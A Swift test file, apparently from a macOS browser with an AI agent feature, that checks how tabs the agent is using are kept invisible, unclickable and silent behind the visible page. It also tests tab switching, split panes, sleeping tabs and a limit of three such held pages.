        private func use(_ tabs: [Tab]) {
            AgentActivity.shared.runStarted()
            for tab in tabs { AgentActivity.shared.use(tab, caller: ChatStore.caller) }
        }

        @Test func aPageTheAIUsesIsHeldBehindThePageInFront() throws {
            let r = rig()
            defer { finish(r) }
            let front = try #require(r.tabs[0].webView), held = try #require(r.tabs[1].webView)
            use([r.tabs[1]])
            host(r.tabs[0], r).update(r.container)
            #expect(front.superview === r.container && r.container.subviews.last === front)
            let passive = try #require(held.superview as? WebViewHost.PassiveHost)
            #expect(passive.superview === r.container && r.container.subviews.first === passive)
            #expect(held.window === r.window, "in the window, so WebKit counts it as visible")
            #expect(r.tabs[1].pageOwner.owns(r.container) && r.tabs[1].pageOwner.place == .behind)
            #expect(r.tabs[0].pageOwner.owns(r.container) && r.tabs[0].pageOwner.place == .front)
        }

        @Test func heldPagesAreFullSizeInvisibleAndOutOfTheUsersReach() throws {
            let r = rig()
            defer { finish(r) }
            let held = try #require(r.tabs[1].webView)
            use([r.tabs[1]])
            host(r.tabs[0], r).update(r.container)
            let passive = try #require(held.superview as? WebViewHost.PassiveHost)
            #expect(passive.frame == r.container.bounds && held.frame == passive.bounds, "laid out at full size")
            #expect(passive.alphaValue == 0)
            #expect(passive.hitTest(NSPoint(x: 10, y: 10)) == nil && r.container.hitTest(NSPoint(x: 10, y: 10)) !== held)
            #expect(!passive.acceptsFirstResponder && !passive.isAccessibilityElement() && (passive.accessibilityChildren() ?? []).isEmpty)
            // Even with the page in front gone from the window, the keys never go to a held page.
            r.window.makeFirstResponder(held)
            host(r.tabs[0], r).update(r.container)
            #expect(r.window.firstResponder !== held)
        }

        @Test func switchingToATabHeldInTheSameHostShowsItInFront() throws {
            let r = rig()
            defer { finish(r) }
            let first = try #require(r.tabs[0].webView), second = try #require(r.tabs[1].webView)
            use([r.tabs[1]])
            host(r.tabs[0], r).update(r.container)
            #expect(second.superview is WebViewHost.PassiveHost)
            // The user switches to the tab the AI was using; the host is reused for it.
            r.browser.activate(r.tabs[1].id)
            host(r.tabs[1], r).update(r.container)
            #expect(second.superview === r.container, "no longer held")
            #expect(r.container.subviews.last === second, "on top of whatever else is there")
            #expect(first.superview == nil || first.superview is WebViewHost.PassiveHost)
            #expect(r.container.subviews.filter { !($0 is WebViewHost.PassiveHost) }.count == 1, "one page in front")
            #expect(r.tabs[1].pageOwner.owns(r.container) && r.tabs[1].pageOwner.place == .front)
            // And back: the tab in front is shown again, and the other held behind if it is still in use.
            use([r.tabs[0]])
            r.browser.activate(r.tabs[0].id)
            host(r.tabs[0], r).update(r.container)
            #expect(first.superview === r.container && r.container.subviews.last === first)
            #expect(second.superview == nil || second.superview is WebViewHost.PassiveHost)
        }

        @Test func aTabWithNoPageDoesNotLetAHeldOneShowThrough() throws {
            let r = rig()
            defer { finish(r) }
            use([r.tabs[1]])
            r.browser.activate(r.tabs[2].id)
            r.tabs[2].sleep()
            host(r.tabs[2], r).update(r.container)
            #expect(r.tabs[2].webView == nil)
            #expect(!r.container.subviews.isEmpty && r.container.subviews.allSatisfy { ($0 as? WebViewHost.PassiveHost)?.alphaValue == 0 }, "only held pages, and none of them visible")
            #expect(r.container.hitTest(NSPoint(x: 10, y: 10)) == nil || r.container.hitTest(NSPoint(x: 10, y: 10)) === r.container)
        }

        @Test func aPageNoLongerInUseLeavesTheWindowAndMayBeShownElsewhere() throws {
            let r = rig()
            defer { finish(r) }
            let held = try #require(r.tabs[1].webView)
            use([r.tabs[1]])
            host(r.tabs[0], r).update(r.container)
            #expect(held.window === r.window)
            AgentActivity.shared.runEnded()
            host(r.tabs[0], r).update(r.container)
            #expect(held.superview == nil && r.container.subviews.count == 1)
        }

        @Test func onlyTheHostOfThePageInFrontHoldsAndASmallerOneNeverDoes() throws {
            let r = rig()
            defer { finish(r) }
            let held = try #require(r.tabs[1].webView)
            use([r.tabs[1]])
            // The other pane of a split, or a peek, updates first: it is not the host of the page in front.
            let pane = WebViewHost.Container(frame: NSRect(x: 0, y: 0, width: 300, height: 300))
            host(r.tabs[2], r).update(pane)
            #expect(held.superview == nil && !pane.isMain)
            r.browser.openPeek(URL(string: "about:blank")!)
            let peek = try #require(r.browser.peek)
            let peekHost = WebViewHost.Container(frame: NSRect(x: 0, y: 0, width: 300, height: 300))
            host(peek, r).update(peekHost)
            #expect(held.superview == nil && !peekHost.isMain)
            host(r.tabs[0], r).update(r.container)
            #expect(r.container.isMain && held.superview?.superview === r.container, "the page in front holds it, at full size")
            host(r.tabs[2], r).update(pane)
            host(peek, r).update(peekHost)
            #expect(held.superview?.superview === r.container, "and the others don't take it away")
            #expect((held.superview as? WebViewHost.PassiveHost)?.frame == r.container.bounds)
        }

        @Test func aHostThatGoesHandsWhatItHeldToTheHostOfThePageInFront() throws {
            let r = rig()
            defer { finish(r) }
            let held = try #require(r.tabs[1].webView)
            use([r.tabs[1]])
            let old = r.container, new = WebViewHost.Container(frame: r.container.frame)
            r.window.contentView!.addSubview(new)
            let tab = host(r.tabs[0], r)
            tab.update(old)
            #expect(held.superview?.superview === old)
            // The split that ended: the new host started, and has already updated by the time the old one goes.
            tab.update(new)
            tab.update(old)
            new.releaseHeld()
            WebViewHost.dismantleNSView(old, coordinator: ())
            #expect(held.superview is WebViewHost.PassiveHost && held.superview?.superview === new, "still in the window")
            #expect(held.window === r.window)
        }

        @Test func aHostThatGoesWithNobodyToTakeOverLetsGoOfWhatItHeld() throws {
            let r = rig()
            defer { finish(r) }
            let held = try #require(r.tabs[1].webView)
            use([r.tabs[1]])
            host(r.tabs[0], r).update(r.container)
            WebViewHost.dismantleNSView(r.container, coordinator: ())
            #expect(held.superview == nil, "free to be held or shown by another host")
        }

        @Test func aHeldPageIsSilentWhileHeldAndNotAfter() throws {
            let r = rig()
            defer { finish(r) }
            let tab = r.tabs[1]
            #expect(!tab.isHeldBehind)
            use([tab])
            host(r.tabs[0], r).update(r.container)
            #expect(tab.isHeldBehind && !tab.isMuted)
            // The user switches to it: it is theirs to hear.
            r.browser.activate(tab.id)
            host(tab, r).update(r.container)
            #expect(!tab.isHeldBehind && tab.webView?.superview === r.container)
            // The user's own mute is not undone by being held, or by being let go.
            r.browser.activate(r.tabs[0].id)
            tab.toggleMute()
            host(r.tabs[0], r).update(r.container)
            #expect(tab.isHeldBehind && tab.isMuted)
            AgentActivity.shared.runEnded()
            host(r.tabs[0], r).update(r.container)
            #expect(!tab.isHeldBehind && tab.isMuted)
        }

        @Test func aPageThatSleepsIsNoLongerHeld() throws {
            let r = rig()
            defer { finish(r) }
            use([r.tabs[1]])
            host(r.tabs[0], r).update(r.container)
            #expect(r.tabs[1].isHeldBehind)
            r.tabs[1].sleep()
            #expect(!r.tabs[1].isHeldBehind)
        }

        @Test func thePageInFrontNeverTakesAPlaceFromAnotherInUse() throws {
            let r = rig(6)
            defer { finish(r) }
            use(Array(r.tabs.dropFirst()))
            AgentActivity.shared.use(r.tabs[0], caller: ChatStore.caller)
            #expect(AgentActivity.shared.held.first == r.tabs[0].id, "the page in front was used last")
            host(r.tabs[0], r).update(r.container)
            let held = r.container.subviews.compactMap { $0 as? WebViewHost.PassiveHost }
            #expect(held.count == AgentActivity.maxHeld)
            #expect(Set(held.compactMap { $0.page }.map(ObjectIdentifier.init)) == Set(r.tabs[3...5].compactMap { $0.webView }.map(ObjectIdentifier.init)), "three behind it, not two")
        }

        @Test func aHeldPageThatSleepsAndWakesTellsTheViewThatHoldsIt() async throws {
            let r = rig()
            defer { finish(r) }
            use([r.tabs[1]])
            host(r.tabs[0], r).update(r.container)
            var changes = 0
            let sink = AgentActivity.shared.objectWillChange.sink { changes += 1 }
            defer { sink.cancel() }
            r.tabs[2].sleep()
            r.tabs[1].sleep()
            #expect(await waitUntil { changes > 0 })
            changes = 0
            let woken = r.tabs[1].wake()
            #expect(await waitUntil { changes > 0 })
            host(r.tabs[0], r).update(r.container)
            #expect(woken.superview is WebViewHost.PassiveHost, "held again, in its new page")
        }

        @Test func aTabThatGetsUsedWhileItsMediaIsBeingCheckedIsNotPutToSleep() async throws {
            let r = rig()
            defer { finish(r) }
            r.tabs[1].lastShown = .distantPast
            r.tabs[2].lastShown = .distantPast
            r.browser.sleepIdleTabs(olderThan: 0)
            use([r.tabs[1]])
            #expect(await waitUntil { r.tabs[2].webView == nil }, "an idle one goes to sleep")
            try await Task.sleep(for: .milliseconds(300))
            #expect(r.tabs[1].webView != nil, "the one the AI started to use meanwhile stays")
        }

        @Test func atMostThreeAreHeldAtOnce() throws {
            let r = rig(6)
            defer { finish(r) }
            use(Array(r.tabs.dropFirst()))
            host(r.tabs[0], r).update(r.container)
            let held = r.container.subviews.compactMap { $0 as? WebViewHost.PassiveHost }
            #expect(held.count == AgentActivity.maxHeld)
            #expect(Set(held.compactMap { $0.page }.map(ObjectIdentifier.init)) == Set(r.tabs.suffix(3).compactMap { $0.webView }.map(ObjectIdentifier.init)), "the most recently used")
        }
    }
}
